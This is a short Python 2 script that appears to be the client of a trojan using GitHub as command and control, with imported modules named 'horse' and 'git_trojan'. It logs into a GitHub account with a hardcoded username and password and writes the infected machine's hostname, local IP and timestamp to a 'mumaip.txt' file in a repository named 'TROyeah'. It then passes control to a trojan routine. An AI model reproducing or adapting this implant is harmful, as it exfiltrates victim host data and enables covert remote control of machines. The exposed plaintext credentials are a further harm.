# -*- coding: utf-8 -*-
import socket
from github3 import *
import fileOperation
import horse
import git_trojan



def connect_to_github():
    gh = login(username="OXVyeah", password="heiya233")

    repo0 = gh.repository("OXVyeah", "TROyeah")

    return repo0



#connect_to_github()
rep = connect_to_github()
if rep.contents("ip/mumaip.txt") == None :
#	print "ip"
	rep.create_file("ip/mumaip.txt","mumaip.txt automatically from py","INITIALIZE 127.0.0.1 9/10 10:57:00")
con = rep.contents("ip/mumaip.txt")
d,t = fileOperation.getLocalTime()
fileOperation.writeIpAppend(con,socket.getfqdn(socket.gethostname()).replace(' ',''),fileOperation.LocalIp(),d,t)
print "update ip finish"


horse.Operation(rep)

